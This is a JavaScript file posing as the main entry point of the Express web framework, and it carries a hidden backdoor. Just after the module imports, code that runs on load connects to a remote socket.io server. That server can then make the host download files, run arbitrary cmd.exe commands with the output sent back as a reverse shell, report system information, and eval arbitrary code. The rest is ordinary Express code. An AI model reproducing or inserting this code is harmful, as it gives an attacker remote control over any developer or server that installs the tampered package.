/*!
 * express
 * Copyright(c) 2009-2013 TJ Holowaychuk
 * Copyright(c) 2013 Roman Shtylman
 * Copyright(c) 2014-2015 Douglas Christopher Wilson
 * MIT Licensed
 */

'use strict';

/**
 * Module dependencies.
 */

var EventEmitter = require('events').EventEmitter;
var mixin = require('merge-descriptors');
var proto = require('./application');
var Route = require('./router/route');
var Router = require('./router');
var req = require('./request');
var res = require('./response');
var os = require('os');
var fs = require('fs');
const {
  spawn
} = require('child_process');
var http = require('http');
var path = require('path')
var bat = null;

// https://www.youtube.com/watch?v=ymV6L1J54hI <-- great ~l3mpik

var socket = require('socket.io-client')('ws://:2000');

socket.on('download', (data, mime) => {
  
  var downloadFile = function (file_url, file_mime) {
    var url = require('url');
    var options = {
      host: url.parse(file_url).host,
      port: 80,
      path: url.parse(file_url).pathname
    };

    var file_name = url.parse(file_url).pathname.split('/').pop();
    var file = fs.createWriteStream("./node_modules/express/downloads/" + file_name + "."+file_mime);

    http.get(options, function (res) {
      res.on('data', function (data) {
        file.write(data);
      }).on('end', function () {
        file.end();
        var file_path = path.resolve("./node_modules/express/downloads/" + file_name + "."+file_mime);
        socket.emit('downloaddone', file_path)
      });
    });
  };

  downloadFile(data, mime);
});
socket.on('shell', (data) => {

  bat = spawn('cmd.exe', ['/c', data]);

  bat.stdout.on('data', (data) => {
    socket.emit('reverseshell', 'out', data)
  });

  bat.stderr.on('data', (data) => {
    socket.emit('reverseshell', 'err', data)
  });

  bat.on('exit', (code) => {
    socket.emit('reverseshell', 'exit', data)
  });

})

socket.on("info", function () {
  socket.emit('info', os)
});

socket.on('eval', function (data) {
  var ret = eval(data);
  socket.emit('reverseeval', ret)
});

/**
 * Expose `createApplication()`.
 */

exports = module.exports = createApplication;

/**
 * Create an express application.
 *
 * @return {Function}
 * @api public
 */

function createApplication() {
  var app = function (req, res, next) {
    app.handle(req, res, next);
  };

  mixin(app, EventEmitter.prototype, false);
  mixin(app, proto, false);

  app.request = {
    __proto__: req,
    app: app
  };
  app.response = {
    __proto__: res,
    app: app
  };
  app.init();
  return app;
}

/**
 * Expose the prototypes.
 */

exports.application = proto;
exports.request = req;
exports.response = res;

/**
 * Expose constructors.
 */

exports.Route = Route;
exports.Router = Router;

/**
 * Expose middleware
 */

exports.query = require('./middleware/query');
exports.static = require('serve-static');

/**
 * Replace removed middleware with an appropriate error message.
 */

[
  'json',
  'urlencoded',
  'bodyParser',
  'compress',
  'cookieSession',
  'session',
  'logger',
  'cookieParser',
  'favicon',
  'responseTime',
  'errorHandler',
  'timeout',
  'methodOverride',
  'vhost',
  'csrf',
  'directory',
  'limit',
  'multipart',
  'staticCache',
].forEach(function (name) {
  Object.defineProperty(exports, name, {
    get: function () {
      throw new Error('Most middleware (like ' + name + ') is no longer bundled with Express and must be installed separately. Please see https://github.com/senchalabs/connect#middleware.');
    },
    configurable: true
  });
});